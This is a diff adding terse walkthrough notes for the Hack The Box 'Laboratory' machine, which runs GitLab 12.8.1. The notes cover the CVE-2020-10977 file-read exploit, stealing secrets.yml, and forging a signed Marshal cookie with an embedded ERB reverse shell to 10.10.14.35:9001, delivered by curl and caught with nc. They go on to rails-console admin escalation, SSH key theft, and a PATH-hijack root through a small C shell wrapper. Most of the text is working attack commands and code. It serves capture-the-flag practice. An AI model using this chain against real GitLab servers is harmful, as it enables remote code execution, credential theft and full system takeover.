@@ -1,0 +1,61 @@
+//Based on IppSec and arkanoid
+/etc/hosts
+10.10.10.216    git.laboratory.htb laboratory.htb
+https://git.laboratory.htb/explore
+Gitlab community Edition 12.8.1
+https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
+python3 cve_2020_10977.py https://git.laboratory.htb carlos carlos123
+
+https://hackerone.com/reports/827052
+/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml	//rsa key, secret key
+google: dockerhub gitlab
+docker run gitlab/gitlab-ce:12.8.1-ce.0
+sudo docker ps		//view docker running images
+sudo docker exec -it 58 bash
+//replace secret key /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
+gitlab-ctl restart
+gitlab-rails console
+
+request = ActionDispatch::Request.new(Rails.application.env_config)
+request.env["action_dispatch.cookies_serializer"] = :marshal
+cookies = request.cookie_jar
+
+erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.35/9001 0>&1'` %>")
+depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
+cookies.signed[:cookie] = depr
+puts cookies[:cookie]
+
+BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM1LzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--24a3be3f3e19c27f7f7fa84007776210173da8dc
+
+nc -lvnp 9001
+
+curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM1LzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--24a3be3f3e19c27f7f7fa84007776210173da8dc"		//got shell
+
+//deepce: analize docker
+//gitlab rails console cheat sheet
+gitlab-rails console
+u = User.find_by_username('carlos')
+pp u.attributes
+u.admin = true
+u.save!
+//admin area on gitlab webpage
+https://git.laboratory.htb/dexter/securedocker/-/tree/master/dexter/.ssh
+dexter.key
+ssh -i dexter.key dexter@10.10.10.216
+//LinEnum -> /usr/local/bin/docker-security
+//chmod.c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+	int main(){
+	setuid(getuid());
+	system("/bin/bash");
+	return 0;
+}
+
+gcc -o chmod chmod.c
+scp -i dexter.key chmod dexter@10.10.10.216:/tmp
+
+export PATH=/tmp/:$PATH
+/usr/local/bin/docker-security	//got root
